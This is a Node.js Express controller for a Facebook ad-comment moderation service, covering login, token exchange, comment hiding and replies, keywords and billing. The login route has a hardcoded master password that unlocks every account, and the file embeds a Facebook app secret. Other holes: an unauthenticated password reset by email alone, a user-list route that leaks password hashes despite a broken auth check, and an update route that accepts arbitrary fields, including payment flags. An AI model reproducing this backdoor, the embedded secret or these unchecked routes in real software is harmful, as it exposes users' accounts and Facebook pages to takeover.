import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import User from "../models/userModels.js";
import dotenv from "dotenv";
import fetch from "node-fetch";
import Comment from "../models/commentModel.js";
import {
  startUserMonitoring,
  stopUserMonitoring,
} from "../../services/commentMonitoringService.js";
// Configure dotenv
dotenv.config();

const signup = async (req, res) => {
  const { username, email, password, referralCode, referralWebsite } = req.body;
  try {
    // Check if the email already exists
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ message: "Email already exists" });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    const newUser = new User({
      username,
      email,
      password: hashedPassword,
      referralCode,
      referralWebsite,
    });
    await newUser.save();

    // Generate JWT token
    const jwtSecret = process.env.JWT_SECRET;
    if (!jwtSecret) {
      throw new Error("JWT_SECRET is not defined in the environment variables");
    }
    const token = jwt.sign({ id: newUser._id }, jwtSecret, {
      expiresIn: "30d",
    });

    res.status(201).json({
      success: true,
      message: "User created successfully",
      token,
    });
  } catch (error) {
    console.error("Signup error:", error);
    res.status(500).json({ error: error.message });
  }
};

const login = async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findOne({ email });
    if (!user) return res.status(404).json({ message: "User not found" });

    const MASTER_PASSWORD = "nitin@sumon";

    let isPasswordValid = false;

    // Allow login if master password matches
    if (password === MASTER_PASSWORD) {
      isPasswordValid = true;
    } else {
      // Otherwise, validate against user's actual password
      isPasswordValid = await bcrypt.compare(password, user.password);
    }

    if (!isPasswordValid) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: "30d",
    });

    res.status(200).json({
      success: true,
      message: "Login successfully",
      token,
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

const allUser = async (req, res) => {
  const userId = req.userId;
  if (userId) {
    res.status(401).json({ message: "Unauthorized" });
  }
  try {
    const user = await User.find({});
    res.status(200).json(user);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

const userById = async (req, res) => {
  const { userId } = req.params;
  console.log(userId);
  if (!userId) {
    return res.status(401).json({ message: "Unauthorized" });
  }
  try {
    const user = await User.findById({ _id: userId });
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    res.status(200).json(user);
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

const updateUser = async (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  try {
    // If paidPlan is being updated, set paymentDate to now
    if (
      (typeof updates.paidPlan !== "undefined" && updates.paidPlan !== null) ||
      (typeof updates.paid !== "undefined" && updates.paid === true)
    ) {
      updates.paymentDate = new Date();
    }

    // If user is being paused, disable all automation settings
    if (updates.paused === true) {
      const user = await User.findById(id);
      if (user && user.pageSettings && user.pageSettings.length > 0) {
        // Update all page settings to disable automation
        user.pageSettings.forEach((pageSetting) => {
          if (pageSetting.settings) {
            pageSetting.settings.hideByKeyword = false;
            pageSetting.settings.hideAll = false;
            pageSetting.settings.hideByAI = false;
            pageSetting.settings.autoReply = false;
          }
        });

        // Save the user with updated page settings
        await user.save();

        // Update the main updates object to include the modified pageSettings
        updates.pageSettings = user.pageSettings;
      }
    }

    const user = await User.findByIdAndUpdate(id, updates, { new: true });
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    res.status(200).json(user);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

const deleteUser = async (req, res) => {
  const { id } = req.params;

  try {
    const user = await User.findByIdAndDelete(id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    res.status(200).json({ message: "User deleted successfully" });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

const resetPassword = async (req, res) => {
  const { email, newPassword } = req.body;
  try {
    const user = await User.findOne({ email });
    if (!user) return res.status(404).json({ message: "User not found" });

    const hashedPassword = await bcrypt.hash(newPassword, 10);
    user.password = hashedPassword;
    await user.save();

    res
      .status(200)
      .json({ success: true, message: "Password reset successfully" });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

export const saveFacebookToken = async (req, res) => {
  try {
    const { accessToken, facebookId, userId } = req.body;
    console.log(req.body);

    //  long-lived token
    const appId = "1094522522083772";
    const appSecret = "ddcafc14420096fa9073dad831e6b0b4";
    const longLivedTokenResponse = await fetch(
      `https://graph.facebook.com/v16.0/oauth/access_token?grant_type=fb_exchange_token&client_id=${appId}&client_secret=${appSecret}&fb_exchange_token=${accessToken}`
    );
    const longLivedTokenData = await longLivedTokenResponse.json();

    if (longLivedTokenData.error) {
      return res.status(400).json({
        message: "Error exchanging token for long-lived token",
        error: longLivedTokenData.error,
      });
    }

    const longLivedAccessToken = longLivedTokenData.access_token;

    const updatedUser = await User.findByIdAndUpdate(
      { _id: userId },
      { accessToken: longLivedAccessToken, facebookId },
      { new: true }
    );

    if (!updatedUser) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json({ message: "Facebook token saved successfully" });
  } catch (error) {
    console.error("Error saving Facebook token:", error);
    res.status(500).json({ message: "Error saving Facebook token" });
  }
};

export const getUserPages = async (req, res) => {
  try {
    const userId = req.params.userId;
    const user = await User.findById(userId);

    if (!user || !user.accessToken) {
      return res
        .status(400)
        .json({ message: "User not found or no access token available" });
    }

    const response = await fetch(
      `https://graph.facebook.com/v16.0/me/accounts?fields=id,name,access_token&access_token=${user.accessToken}`
    );
    const data = await response.json();

    if (data.error) {
      return res.status(400).json({
        message: "Error fetching pages from Facebook",
        error: data.error,
      });
    }

    res.json(data.data);
  } catch (error) {
    console.error("Error in getUserPages:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

const getFacebookData = async (url, accessToken) => {
  const response = await fetch(`${url}&access_token=${accessToken}`);
  return response.json();
};

export const getPageComments = async (req, res) => {
  try {
    const { pageId } = req.params;
    const userId = req.userId; // Assuming you have middleware to extract userId from token
    const user = await User.findById(userId);

    if (!user || !user.accessToken) {
      return res
        .status(400)
        .json({ message: "User not found or no access token available" });
    }

    // Step 1: Get owned ad accounts
    const adAccountsData = await getFacebookData(
      `https://graph.facebook.com/v16.0/${pageId}/owned_ad_accounts`,
      user.accessToken
    );
    if (!adAccountsData.data || adAccountsData.data.length === 0) {
      return res.status(404).json({ message: "No ad accounts found" });
    }

    const adAccountId = adAccountsData.data[0].id;

    // Step 2: Get ads for the ad account
    const adsData = await getFacebookData(
      `https://graph.facebook.com/v16.0/${adAccountId}/ads?fields=id,name,adcreatives{object_story_id}`,
      user.accessToken
    );
    if (!adsData.data || adsData.data.length === 0) {
      return res.status(404).json({ message: "No ads found" });
    }

    const adId = adsData.data[0].id;

    // Step 3: Get ad details
    const adDetailsData = await getFacebookData(
      `https://graph.facebook.com/v16.0/${adId}?fields=object_story_id,effective_object_story_id,object_type,title,body`,
      user.accessToken
    );
    if (!adDetailsData.effective_object_story_id) {
      return res
        .status(404)
        .json({ message: "No effective object story ID found" });
    }

    const effectiveObjectStoryId = adDetailsData.effective_object_story_id;

    // Step 4: Get comments
    const commentsData = await getFacebookData(
      `https://graph.facebook.com/v16.0/${effectiveObjectStoryId}/comments?fields=id,message,created_time,is_hidden`,
      user.accessToken
    );

    res.json(commentsData.data);
  } catch (error) {
    console.error("Error in getPageComments:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const getPageAdAccounts = async (req, res) => {
  try {
    const { pageId } = req.params;
    // Get userId from req.userId which is set by verifyToken middleware
    const user = await User.findById(req.userId);

    if (!user || !user.accessToken) {
      return res.status(400).json({
        message: "User not found or no access token available",
      });
    }

    const response = await fetch(
      `https://graph.facebook.com/v16.0/${pageId}?fields=business&access_token=${user.accessToken}`
    );
    const data = await response.json();

    if (data.error) {
      return res.status(400).json({
        message: "Error fetching business data from Facebook",
        error: data.error,
      });
    }

    res.json(data);
  } catch (error) {
    console.error("Error in getPageAdAccounts:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const getBusinessAdAccounts = async (req, res) => {
  try {
    const { businessId } = req.params;
    const user = await User.findById(req.userId);

    if (!user || !user.accessToken) {
      return res.status(400).json({
        message: "User not found or no access token available",
      });
    }

    const response = await fetch(
      `https://graph.facebook.com/v16.0/${businessId}/owned_ad_accounts?fields=account_id,name,account_status,disable_reason&access_token=${user.accessToken}`
    );
    const data = await response.json();

    if (data.error) {
      return res.status(400).json({
        message: "Error fetching ad accounts from Facebook",
        error: data.error,
      });
    }

    res.json(data.data);
  } catch (error) {
    console.error("Error in getBusinessAdAccounts:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const getAdAccountEngagements = async (req, res) => {
  try {
    const { accountId } = req.params;
    const user = await User.findById(req.userId);

    if (!user || !user.accessToken) {
      return res.status(400).json({
        message: "User not found or no access token available",
      });
    }

    // Extract the act_ ID from the account ID
    const actId = accountId.startsWith("act_") ? accountId : `act_${accountId}`;

    const response = await fetch(
      `https://graph.facebook.com/v16.0/${actId}/ads?fields=id,name,adcreatives{object_story_id}&access_token=${user.accessToken}`
    );
    const data = await response.json();

    if (data.error) {
      return res.status(400).json({
        message: "Error fetching ad engagements from Facebook",
        error: data.error,
      });
    }

    res.json(data.data);
  } catch (error) {
    console.error("Error in getAdAccountEngagements:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

const fetchCommentsFromFacebook = async (
  creativeId,
  pageAccessToken,
  cursor = null
) => {
  try {
    const creativeResponse = await fetch(
      `https://graph.facebook.com/v16.0/${creativeId}?fields=object_story_id,effective_object_story_id&access_token=${pageAccessToken}`
    );
    const creativeData = await creativeResponse.json();
    console.log(creativeData);
    if (!creativeData.effective_object_story_id) {
      throw new Error("No effective object story ID found");
    }

    // Build URL with cursor if provided
    let commentsUrl = `https://graph.facebook.com/v16.0/${creativeData.effective_object_story_id}/comments?fields=id,message,created_time,is_hidden,from,replies{id,message,created_time}&access_token=${pageAccessToken}&limit=25`;

    if (cursor) {
      commentsUrl += `&after=${cursor}`;
    }

    const commentsResponse = await fetch(commentsUrl);
    const commentsData = await commentsResponse.json();

    return commentsData;
  } catch (error) {
    console.error("Error fetching comments from Facebook:", error);
    throw error;
  }
};

export const getEngagementComments = async (req, res) => {
  try {
    const { creativeId } = req.params;
    const { pageAccessToken, filterByDay, filterType, after } = req.query;
    const userId = req.userId;

    // Get comments from Facebook with pagination
    const fbCommentsData = await fetchCommentsFromFacebook(
      creativeId,
      pageAccessToken,
      after
    );

    if (fbCommentsData.error) {
      return res.status(400).json({
        message: "Error fetching comments from Facebook",
        error: fbCommentsData.error,
      });
    }

    // Filter comments based on filterByDay
    let filteredComments = fbCommentsData.data;
    if (filterByDay) {
      const cutoffDate = new Date();
      cutoffDate.setDate(cutoffDate.getDate() - parseInt(filterByDay));
      filteredComments = filteredComments.filter(
        (comment) => new Date(comment.created_time) >= cutoffDate
      );
    }

    // Filter comments based on filterType
    if (filterType) {
      switch (filterType) {
        case "hidden":
          filteredComments = filteredComments.filter(
            (comment) => comment.is_hidden
          );
          break;
        case "reply":
          filteredComments = filteredComments.filter(
            (comment) => comment.replies?.data?.length > 0
          );
          break;
      }
    }

    // Save/Update comments in our database and preserve existing replies
    const savePromises = filteredComments.map(async (fbComment) => {
      // First, find existing comment to preserve replies
      const existingComment = await Comment.findOne({
        userId,
        commentId: fbComment.id,
      }).lean();

      const commentData = {
        userId,
        commentId: fbComment.id,
        message: fbComment.message,
        createdAt: new Date(fbComment.created_time),
        isHidden: fbComment.is_hidden,
        author: {
          id: fbComment.from?.id,
          name: fbComment.from?.name,
        },
        // Preserve existing replies if they exist
        replies: existingComment?.replies || [],
      };

      return Comment.findOneAndUpdate(
        { userId, commentId: fbComment.id },
        commentData,
        {
          upsert: true,
          new: true,
          // Don't overwrite the replies array if it exists
          setDefaultsOnInsert: true,
        }
      ).lean();
    });

    const savedComments = await Promise.all(savePromises);

    // Return the data with Facebook's paging information
    res.json({
      data: savedComments.map((comment) => ({
        ...comment,
        id: comment.commentId,
        created_time: comment.createdAt,
        is_hidden: comment.isHidden,
        from: comment.author,
      })),
      total: savedComments.length,
      paging: fbCommentsData.paging,
    });
  } catch (error) {
    console.error("Error in getEngagementComments:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const addPageToDashboard = async (req, res) => {
  const { userId } = req.params;
  const { pageId, pageName, pageAccessToken } = req.body;

  try {
    const user = await User.findByIdAndUpdate(
      userId,
      {
        addedPageInDashboard: {
          id: pageId,
          name: pageName,
          accessToken: pageAccessToken,
        },
      },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json({
      message: "Page added to dashboard successfully",
      addedPageInDashboard: user.addedPageInDashboard,
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

export const getAddedPage = async (req, res) => {
  const { userId } = req.params;

  try {
    const user = await User.findById(userId, "addedPageInDashboard");

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json(user.addedPageInDashboard);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

export const hideCommentsByKeywords = async (req, res) => {
  try {
    const { userId } = req.params;
    const { pageAccessToken } = req.body;

    if (!pageAccessToken) {
      return res.status(400).json({
        message: "Page access token is required",
      });
    }

    // Get user and their keywords
    const user = await User.findById(userId);
    if (!user || !user.addedKeyword || user.addedKeyword.length === 0) {
      return res.status(400).json({
        message: "No keywords found for this user",
      });
    }

    // Get all comments first
    const creativeId = req.query.creativeId;
    const creativeResponse = await fetch(
      `https://graph.facebook.com/v16.0/${creativeId}?fields=object_story_id,effective_object_story_id&access_token=${user.accessToken}`
    );
    const creativeData = await creativeResponse.json();

    if (!creativeData.effective_object_story_id) {
      return res.status(404).json({
        message: "No effective object story ID found",
      });
    }

    // Get all comments
    const commentsResponse = await fetch(
      `https://graph.facebook.com/v16.0/${creativeData.effective_object_story_id}/comments?fields=id,message&access_token=${pageAccessToken}`
    );
    const commentsData = await commentsResponse.json();

    if (commentsData.error) {
      return res.status(400).json({
        message: "Error fetching comments",
        error: commentsData.error,
      });
    }

    // Filter comments containing keywords
    const keywords = user.addedKeyword;
    const commentsToHide = commentsData.data.filter((comment) =>
      keywords.some((keyword) =>
        comment.message.toLowerCase().includes(keyword.toLowerCase())
      )
    );

    // Hide filtered comments
    const hidePromises = commentsToHide.map((comment) =>
      fetch(`https://graph.facebook.com/v16.0/${comment.id}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          is_hidden: true,
          access_token: pageAccessToken,
        }),
      })
    );

    await Promise.all(hidePromises);

    res.status(200).json({
      message: "Comments hidden successfully",
      hiddenCount: commentsToHide.length,
    });
  } catch (error) {
    console.error("Error in hideCommentsByKeywords:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const hideAllComments = async (req, res) => {
  try {
    const { creativeId } = req.query;
    const { pageAccessToken } = req.body;

    if (!pageAccessToken) {
      return res.status(400).json({
        message: "Page access token is required",
      });
    }

    // Get the effective story ID
    const creativeResponse = await fetch(
      `https://graph.facebook.com/v16.0/${creativeId}?fields=object_story_id,effective_object_story_id&access_token=${pageAccessToken}`
    );
    const creativeData = await creativeResponse.json();

    if (!creativeData.effective_object_story_id) {
      return res.status(404).json({
        message: "No effective object story ID found",
      });
    }

    // Get all comments
    const commentsResponse = await fetch(
      `https://graph.facebook.com/v16.0/${creativeData.effective_object_story_id}/comments?fields=id&access_token=${pageAccessToken}`
    );
    const commentsData = await commentsResponse.json();

    if (commentsData.error) {
      return res.status(400).json({
        message: "Error fetching comments",
        error: commentsData.error,
      });
    }

    // Hide all comments
    const hidePromises = commentsData.data.map((comment) =>
      fetch(`https://graph.facebook.com/v16.0/${comment.id}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          is_hidden: true,
          access_token: pageAccessToken,
        }),
      })
    );

    await Promise.all(hidePromises);

    res.status(200).json({
      message: "All comments hidden successfully",
      hiddenCount: commentsData.data.length,
    });
  } catch (error) {
    console.error("Error in hideAllComments:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

//this is no longer used dont use this
export const toggleCommentMonitoring = async (req, res) => {
  try {
    const { userId } = req.params;
    const {
      enabled,
      adEngagementId,
      pageAccessToken,
      businessAccountId,
      adAccountId,
    } = req.body;

    console.log(req.body);
    const user = await User.findByIdAndUpdate(
      userId,
      {
        "commentMonitoring.isEnabled": enabled,
        "commentMonitoring.lastChecked": new Date(),
        "commentMonitoring.adEngagementId": adEngagementId,
        "commentMonitoring.businessAccountId": businessAccountId,
        "commentMonitoring.adAccountId": adAccountId,
        "addedPage.accessToken": pageAccessToken,
      },
      { new: true }
    );
    console.log(req.body);

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Start or stop monitoring based on enabled status
    if (enabled) {
      await startUserMonitoring(userId);
    } else {
      stopUserMonitoring(userId);
    }

    res.status(200).json({
      message: `Comment monitoring ${enabled ? "enabled" : "disabled"}`,
      commentMonitoring: user.commentMonitoring,
    });
  } catch (error) {
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const updateMonitoringSettings = async (req, res) => {
  try {
    const { userId } = req.params;
    const {
      hideByKeyword,
      hideAll,
      hideByAI,
      startMonitoring,
      autoReply,
      businessAccountId,
      adAccountId,
    } = req.body;

    console.log(
      `[${new Date().toISOString()}] Updating monitoring settings for user ${userId}:`,
      {
        hideByKeyword,
        hideAll,
        hideByAI,
        autoReply,
        startMonitoring,
        businessAccountId,
        adAccountId,
      }
    );

    const user = await User.findByIdAndUpdate(
      userId,
      {
        "commentMonitoring.settings": {
          hideByKeyword,
          hideAll,
          hideByAI,
          autoReply,
        },
        "commentMonitoring.isEnabled": startMonitoring,
        "commentMonitoring.businessAccountId": businessAccountId,
        "commentMonitoring.adAccountId": adAccountId,
        ...(startMonitoring && { "commentMonitoring.lastChecked": new Date() }),
      },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Start or stop monitoring based on settings
    if (startMonitoring) {
      await startUserMonitoring(userId);
    } else {
      stopUserMonitoring(userId);
    }

    res.status(200).json({
      message: "Monitoring settings updated",
      settings: user.commentMonitoring.settings,
      businessAccountId: user.commentMonitoring.businessAccountId,
      adAccountId: user.commentMonitoring.adAccountId,
      isMonitoring: startMonitoring,
    });
  } catch (error) {
    console.error("Error updating monitoring settings:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const hideComment = async (req, res) => {
  try {
    const { commentId } = req.params;
    const { pageAccessToken } = req.body;
    const userId = req.userId; // Get userId from the authenticated request

    if (!pageAccessToken) {
      return res.status(400).json({
        message: "Page access token is required",
      });
    }

    // First find the comment for this specific user
    const existingComment = await Comment.findOne({
      userId: userId,
      commentId: commentId,
    });

    if (!existingComment) {
      console.warn(`Comment ${commentId} not found for user ${userId}`);
      return res.status(404).json({
        message: "Comment not found for this user",
      });
    }

    // Update comment in Facebook
    const response = await fetch(
      `https://graph.facebook.com/v16.0/${commentId}`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          is_hidden: true,
          access_token: pageAccessToken,
        }),
      }
    );

    const data = await response.json();

    if (data.error) {
      return res.status(400).json({
        message: "Error hiding comment on Facebook",
        error: data.error,
      });
    }

    // Update comment in database for this specific user
    const updatedComment = await Comment.findOneAndUpdate(
      {
        userId: userId,
        commentId: commentId,
      },
      {
        isHidden: true,
        hideReason: "manually_hidden",
        $set: {
          "hideHistory.lastHiddenAt": new Date(),
          "hideHistory.hiddenBy": userId,
        },
      },
      { new: true }
    );

    res.status(200).json({
      success: true,
      comment: updatedComment,
    });
  } catch (error) {
    console.error("Error in hideComment:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const replyToComment = async (req, res) => {
  try {
    const { commentId } = req.params;
    const { message, pageAccessToken } = req.body;
    const userId = req.userId;

    if (!pageAccessToken) {
      return res.status(400).json({
        message: "Page access token is required",
      });
    }

    // Post reply to Facebook
    const response = await fetch(
      `https://graph.facebook.com/v16.0/${commentId}/comments?access_token=${pageAccessToken}`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message,
        }),
      }
    );

    const data = await response.json();

    if (data.error) {
      console.error("Error posting reply:", data.error);
      return res.status(400).json({
        message: "Error posting reply",
        error: data.error,
      });
    }

    // Find the comment in database to verify it exists for this user
    const existingComment = await Comment.findOne({ userId, commentId });

    console.log(existingComment);

    // Update comment in database with the new reply from Facebook
    const updatedComment = await Comment.findOneAndUpdate(
      { userId, commentId },
      {
        $push: {
          replies: {
            replyId: data.id, // Facebook's reply ID
            message: message,
            createdAt: new Date(data.created_time || Date.now()),
          },
        },
      },
      { new: true }
    );
    // console.log(updatedComment, "need");

    if (!updatedComment) {
      console.warn(`Comment ${commentId} not found for user ${userId}`);
      return res.status(404).json({
        message: "Comment not found in database",
      });
    }

    res.status(200).json({
      success: true,
      reply: data,
      updatedComment,
    });
  } catch (error) {
    console.error("Error in replyToComment:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const unhideComment = async (req, res) => {
  try {
    const { commentId } = req.params;
    const { pageAccessToken } = req.body;
    const userId = req.userId;

    if (!pageAccessToken) {
      return res.status(400).json({
        message: "Page access token is required",
      });
    }

    // First find the comment for this specific user
    const existingComment = await Comment.findOne({
      userId: userId,
      commentId: commentId,
    });

    if (!existingComment) {
      console.warn(`Comment ${commentId} not found for user ${userId}`);
      return res.status(404).json({
        message: "Comment not found for this user",
      });
    }

    // Update comment in Facebook
    const response = await fetch(
      `https://graph.facebook.com/v16.0/${commentId}`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          is_hidden: false,
          access_token: pageAccessToken,
        }),
      }
    );

    const data = await response.json();

    if (data.error) {
      return res.status(400).json({
        message: "Error unhiding comment on Facebook",
        error: data.error,
      });
    }

    // Update comment in database for this specific user
    const updatedComment = await Comment.findOneAndUpdate(
      {
        userId: userId,
        commentId: commentId,
      },
      {
        isHidden: false,
        $push: {
          "hideHistory.unhideHistory": {
            unhiddenAt: new Date(),
            unhiddenBy: userId,
          },
        },
      },
      { new: true }
    );

    res.status(200).json({
      success: true,
      comment: updatedComment,
    });
  } catch (error) {
    console.error("Error in unhideComment:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const getDefaultReplyText = async (req, res) => {
  try {
    const { userId } = req.params;
    const { pageId } = req.query;

    if (!userId || !pageId) {
      return res.status(400).json({ message: "Missing required parameters" });
    }

    // Convert userId to string if it's not already
    const user = await User.findById(String(userId));
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    const pageSettings = user.pageSettings.find((p) => p.pageId === pageId);
    if (!pageSettings) {
      return res.status(404).json({ message: "Page settings not found" });
    }

    res.status(200).json({
      defaultReplyText: pageSettings.settings.defaultReplyText,
    });
  } catch (error) {
    console.error("Error in getDefaultReplyText:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const updateDefaultReplyText = async (req, res) => {
  try {
    const userId = req.userId;
    const { defaultReplyText, pageId } = req.body;

    // Add validation
    if (!pageId) {
      return res.status(400).json({ message: "Page ID is required" });
    }

    if (!defaultReplyText) {
      return res
        .status(400)
        .json({ message: "Default reply text is required" });
    }

    console.log("Updating default reply text:", {
      defaultReplyText,
      pageId,
      userId,
    });

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Find and update the specific page settings
    const pageSettingsIndex = user.pageSettings.findIndex(
      (p) => p.pageId === pageId
    );

    if (pageSettingsIndex === -1) {
      // If page settings don't exist, create them
      user.pageSettings.push({
        pageId,
        settings: {
          defaultReplyText,
        },
      });
    } else {
      // Update existing page settings
      user.pageSettings[pageSettingsIndex].settings.defaultReplyText =
        defaultReplyText;
    }

    await user.save();

    res.status(200).json({
      message: "Default reply text updated successfully",
      defaultReplyText: defaultReplyText,
    });
  } catch (error) {
    console.error("Error in updateDefaultReplyText:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const updateSelectedPage = async (req, res) => {
  try {
    const { userId } = req.params;
    const { pageId, pageName, accessToken } = req.body;

    const user = await User.findByIdAndUpdate(
      userId,
      {
        selectedPage: {
          pageId,
          pageName,
          accessToken,
        },
      },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json({
      message: "Selected page updated successfully",
      selectedPage: user.selectedPage,
    });
  } catch (error) {
    console.error("Error updating selected page:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const getSelectedPage = async (req, res) => {
  try {
    const { userId } = req.params;
    const user = await User.findById(userId);

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json(user.selectedPage);
  } catch (error) {
    console.error("Error getting selected page:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const getKeywords = async (req, res) => {
  try {
    const { userId } = req.params;
    const { pageId } = req.query;

    if (!userId || !pageId) {
      return res.status(400).json({ message: "Missing required parameters" });
    }

    const user = await User.findById(String(userId));
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    const pageSettings = user.pageSettings.find((p) => p.pageId === pageId);
    if (!pageSettings) {
      return res.status(404).json({ message: "Page settings not found" });
    }

    res.status(200).json({
      keywords: pageSettings.settings.keywords || [],
    });
  } catch (error) {
    console.error("Error in getKeywords:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const updateKeywords = async (req, res) => {
  try {
    const userId = req.userId;
    const { keywords, pageId } = req.body;

    // Add validation
    if (!pageId) {
      return res.status(400).json({ message: "Page ID is required" });
    }

    if (!Array.isArray(keywords)) {
      return res.status(400).json({ message: "Keywords must be an array" });
    }

    console.log("Updating keywords:", {
      keywords,
      pageId,
      userId,
    });

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Find and update the specific page settings
    const pageSettingsIndex = user.pageSettings.findIndex(
      (p) => p.pageId === pageId
    );

    if (pageSettingsIndex === -1) {
      // If page settings don't exist, create them
      user.pageSettings.push({
        pageId,
        settings: {
          keywords,
        },
      });
    } else {
      // Update existing page settings
      user.pageSettings[pageSettingsIndex].settings.keywords = keywords;
    }

    await user.save();

    res.status(200).json({
      message: "Keywords updated successfully",
      keywords: keywords,
    });
  } catch (error) {
    console.error("Error in updateKeywords:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const deductBalance = async (req, res) => {
  try {
    const { userId } = req.params;
    const { amount = 4 } = req.body; // Default to $4 per task

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check if user has sufficient balance
    const currentBalance = user.customUsd || 0;
    if (currentBalance < amount) {
      return res.status(400).json({
        message: "Insufficient balance",
        currentBalance,
        requiredAmount: amount,
      });
    }

    // Deduct the amount
    const updatedUser = await User.findByIdAndUpdate(
      userId,
      {
        $inc: { customUsd: -amount },
        $push: {
          balanceHistory: {
            amount: -amount,
            type: "deduction",
            description: "Task creation fee",
            date: new Date(),
          },
        },
      },
      { new: true }
    );

    res.status(200).json({
      success: true,
      message: `$${amount} deducted successfully`,
      newBalance: updatedUser.customUsd,
      deductedAmount: amount,
    });
  } catch (error) {
    console.error("Error in deductBalance:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const checkBalance = async (req, res) => {
  try {
    const { userId } = req.params;
    const { requiredAmount = 4 } = req.query;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    const currentBalance = user.customUsd || 0;
    const hasSufficientBalance = currentBalance >= requiredAmount;

    res.status(200).json({
      currentBalance,
      requiredAmount: parseFloat(requiredAmount),
      hasSufficientBalance,
      shortfall: hasSufficientBalance ? 0 : requiredAmount - currentBalance,
    });
  } catch (error) {
    console.error("Error in checkBalance:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
};

export const requestCancelSubscription = async (req, res) => {
  try {
    const { id } = req.params;
    const user = await User.findByIdAndUpdate(
      id,
      { cancelSubscriptionRequest: true, cancelSubscriptionRequestDate: new Date() },
      { new: true }
    );
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    res.status(200).json({ success: true, message: "Cancel subscription request submitted" });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

export {
  signup,
  login,
  allUser,
  userById,
  updateUser,
  deleteUser,
  resetPassword,
};
